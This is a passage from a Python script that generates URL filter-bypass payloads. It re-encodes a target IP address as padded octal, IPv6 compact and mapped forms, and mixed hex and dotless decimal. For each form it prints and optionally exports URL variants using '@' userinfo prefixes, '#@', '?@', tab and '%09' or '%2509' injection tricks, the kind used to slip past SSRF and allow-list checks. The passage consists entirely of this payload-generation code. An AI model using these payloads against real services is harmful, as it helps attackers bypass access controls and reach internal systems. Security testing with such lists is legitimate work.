print(bluecolor,"Dotted octal with padding IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP6 = '0' + OCT_SINGLE(ipFrag3) + "." + '00' + OCT_SINGLE(ipFrag2) + "." + '000' + OCT_SINGLE(ipFrag1) + "." + '0000' + OCT_SINGLE(ipFrag0)
print('http://',IP6,':',PORT,'/',sep='')
print('http://',IP6,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP6,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP6,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP6,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP6,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',sep='')
print('http://',IP6,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP6,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP6,':',PORT,'/',sep='')
print('http://',IP6,':',PORT,':80','/',sep='')
print('http://',IP6,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP6,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP6,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP6,':',PORT,'/',file=f,sep='')
	print('http://',IP6,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP6,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP6,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP6,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP6,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',file=f,sep='')
	print('http://',IP6,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP6,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP6,':',PORT,'/',file=f,sep='')
	print('http://',IP6,':',PORT,':80','/',file=f,sep='')
	print('http://',IP6,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP6,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP6,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 7 - IPv6 compact version
print(bluecolor,"IPv6 compact version IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP7 = '[::' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + ']'
print('http://',IP7,':',PORT,'/',sep='')
print('http://',IP7,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP7,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP7,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP7,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP7,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',sep='')
print('http://',IP7,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP7,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP7,':',PORT,'/',sep='')
print('http://',IP7,':',PORT,':80','/',sep='')
print('http://',IP7,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP7,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP7,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP7,':',PORT,'/',file=f,sep='')
	print('http://',IP7,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP7,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP7,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP7,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP7,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',file=f,sep='')
	print('http://',IP7,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP7,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP7,':',PORT,'/',file=f,sep='')
	print('http://',IP7,':',PORT,':80','/',file=f,sep='')
	print('http://',IP7,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP7,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP7,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 8 - IPv6 mapped version
print(bluecolor,"IPv6 mapped version IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP8 = '[::ffff:' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + ']'
print('http://',IP8,':',PORT,'/',sep='')
print('http://',IP8,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP8,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP8,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP8,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP8,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',sep='')
print('http://',IP8,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP8,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP8,':',PORT,'/',sep='')
print('http://',IP8,':',PORT,':80','/',sep='')
print('http://',IP8,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP8,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP8,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP8,':',PORT,'/',file=f,sep='')
	print('http://',IP8,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP8,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP8,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP8,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP8,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',file=f,sep='')
	print('http://',IP8,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP8,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP8,':',PORT,'/',file=f,sep='')
	print('http://',IP8,':',PORT,':80','/',file=f,sep='')
	print('http://',IP8,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP8,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP8,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 9 - Dotted hexadecimal + Dotted octal + Dotless decimal
print(bluecolor,"Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP9 = HEX_SINGLE(ipFrag3,"yes") + "." + OCT_SINGLE(ipFrag2) + "." + str(DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
print('http://',IP9,':',PORT,'/',sep='')
print('http://',IP9,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP9,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP9,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP9,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP9,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',sep='')
print('http://',IP9,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP9,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP9,':',PORT,'/',sep='')
print('http://',IP9,':',PORT,':80','/',sep='')
print('http://',IP9,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP9,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP9,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP9,':',PORT,'/',file=f,sep='')
	print('http://',IP9,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP9,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP9,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP9,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP9,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',file=f,sep='')
	print('http://',IP9,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP9,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP9,':',PORT,'/',file=f,sep='')
	print('http://',IP9,':',PORT,':80','/',file=f,sep='')
	print('http://',IP9,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP9,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP9,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 10 - Dotted hexadecimal + Dotless decimal
print(bluecolor,"Dotted hexadecimal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP10 = HEX_SINGLE(ipFrag3,"yes") + "." + str(DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
print('http://',IP10,':',PORT,'/',sep='')
print('http://',IP10,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP10,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP10,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP10,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP10,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',sep='')
print('http://',IP10,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP10,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP10,':',PORT,'/',sep='')
print('http://',IP10,':',PORT,':80','/',sep='')
print('http://',IP10,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP10,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP10,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP10,':',PORT,'/',file=f,sep='')
	print('http://',IP10,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP10,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP10,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP10,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP10,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',file=f,sep='')
	print('http://',IP10,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP10,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP10,':',PORT,'/',file=f,sep='')
	print('http://',IP10,':',PORT,':80','/',file=f,sep='')
	print('http://',IP10,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP10,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP10,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 11 - Dotted octal with padding + Dotless decimal
print(bluecolor,"Dotted octal with padding + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP11 = '0' + OCT_SINGLE(ipFrag3) + "." + str(DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
print('http://',IP11,':',PORT,'/',sep='')
print('http://',IP11,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP11,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP11,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP11,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP11,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',sep='')
print('http://',IP11,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP11,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP11,':',PORT,'/',sep='')
print('http://',IP11,':',PORT,':80','/',sep='')
print('http://',IP11,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP11,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP11,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IP11,':',PORT,'/',file=f,sep='')
	print('http://',IP11,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP11,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP11,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP11,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IP11,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',file=f,sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',file=f,sep='')
	print('http://',IP11,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP11,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP11,':',PORT,'/',file=f,sep='')
	print('http://',IP11,':',PORT,':80','/',file=f,sep='')
	print('http://',IP11,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP11,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
	print('http://',IP11,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')

#Case 12 - Dotted octal with padding + Dotted hexadecimal + Dotless decimal
print(bluecolor,"Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP12 = '0' + OCT_SINGLE(ipFrag3) + "." + HEX_SINGLE(ipFrag2,"yes") + "." + str(DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
print('http://',IP12,':',PORT,'/',sep='')
print('http://',IP12,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',IP12,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP12,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP12,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',IP12,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',IP12,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',sep='')
print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP12,':',PORT,'/',sep='')
print('http://',IP12,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
print('http://',RANDOMPREFIXVALIDSITE,'+&@',IP12,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
